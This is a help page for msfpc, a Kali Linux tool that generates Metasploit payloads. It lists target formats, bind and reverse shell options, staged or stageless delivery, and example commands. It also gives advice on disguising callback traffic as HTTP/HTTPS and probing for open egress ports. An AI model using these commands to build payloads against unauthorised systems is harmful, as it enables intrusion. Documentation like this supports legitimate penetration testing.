# msfpc command Help

 This command seen on Linux kali 4.6.0-kali1-amd64 #1 SMP Debian 4.6.4-1kali1 (2016-07-21) x86_64 GNU/Linux. For further information please check [docs.kali.org](docs.kali.org) and have a nice day buddy ;) 

~~~


 [01;34m[*][00m [01;34mM[00msfvenom [01;34mP[00mayload [01;34mC[00mreator ([01;34mMPC[00m v[01;34m1.4.3[00m)

 [01;34m/usr/bin/msfpc[00m <[01;01mTYPE[00m> (<[01;01mDOMAIN/IP[00m>) (<[01;01mPORT[00m>) (<[01;01mCMD/MSF[00m>) (<[01;01mBIND/REVERSE[00m>) (<[01;01mSTAGED/STAGELESS[00m>) (<[01;01mTCP/HTTP/HTTPS/FIND_PORT[00m>) (<[01;01mBATCH/LOOP[00m>) (<[01;01mVERBOSE[00m>)
   Example: [01;34m/usr/bin/msfpc windows 192.168.1.10[00m        # Windows & manual IP.
            [01;34m/usr/bin/msfpc elf bind eth0 4444[00m          # Linux, eth0's IP & manual port.
            [01;34m/usr/bin/msfpc stageless cmd py https[00m      # Python, stageless command prompt.
            [01;34m/usr/bin/msfpc verbose loop eth1[00m           # A payload for every type, using eth1's IP.
            [01;34m/usr/bin/msfpc msf batch wan[00m               # All possible Meterpreter payloads, using WAN IP.
            [01;34m/usr/bin/msfpc help verbose[00m                # Help screen, with even more information.

 <[01;01mTYPE[00m>:
   + [01;33mASP[00m
   + [01;33mASPX[00m
   + [01;33mBash[00m [.[01;33msh[00m]
   + [01;33mJava[00m [.[01;33mjsp[00m]
   + [01;33mLinux[00m [.[01;33melf[00m]
   + [01;33mOSX[00m [.[01;33mmacho[00m]
   + [01;33mPerl[00m [.[01;33mpl[00m]
   + [01;33mPHP[00m
   + [01;33mPowershell[00m [.[01;33mps1[00m]
   + [01;33mPython[00m [.[01;33mpy[00m]
   + [01;33mTomcat[00m [.[01;33mwar[00m]
   + [01;33mWindows[00m [.[01;33mexe[00m // .[01;33mdll[00m]

 Rather than putting <DOMAIN/IP>, you can do a interface and MPC will detect that IP address.
 Missing <DOMAIN/IP> will default to the IP menu.

 Missing <PORT> will default to 443.

 <CMD> is a standard/native command prompt/terminal to interactive with.
 <MSF> is a custom cross platform shell, gaining the full power of Metasploit.
 Missing <CMD/MSF> will default to <MSF> where possible.

 <BIND> opens a port on the target side, and the attacker connects to them. Commonly blocked with ingress firewalls rules on the target.
 <REVERSE> makes the target connect back to the attacker. The attacker needs an open port. Blocked with engress firewalls rules on the target.
 Missing <BIND/REVERSE> will default to <REVERSE>.

 <STAGED> splits the payload into parts, making it smaller but dependent on Metasploit.
 <STAGELESS> is the complete standalone payload. More 'stable' than <STAGED>.
 Missing <STAGED/STAGELESS> will default to <STAGED> where possible.

 <TCP> is the standard method to connecting back. This is the most compatible with TYPES as its RAW. Can be easily detected on IDSs.
 <HTTP> makes the communication appear to be HTTP traffic (unencrypted). Helpful for packet inspection, which limit port access on protocol - e.g. TCP 80.
 <HTTPS> makes the communication appear to be (encrypted) HTTP traffic using as SSL. Helpful for packet inspection, which limit port access on protocol - e.g. TCP 443.
 <FIND_PORT> will attempt every port on the target machine, to find a way out. Useful with stick ingress/engress firewall rules. Will switch to 'allports' based on <TYPE>.
 Missing <TCP/HTTP/HTTPS/FIND_PORT> will default to <TCP>.

 <BATCH> will generate as many combinations as possible: <TYPE>, <CMD + MSF>, <BIND + REVERSE>, <STAGED + STAGLESS> & <TCP + HTTP + HTTPS + FIND_PORT> 
 <LOOP> will just create one of each <TYPE>.

 <VERBOSE> will display more information.

~~~
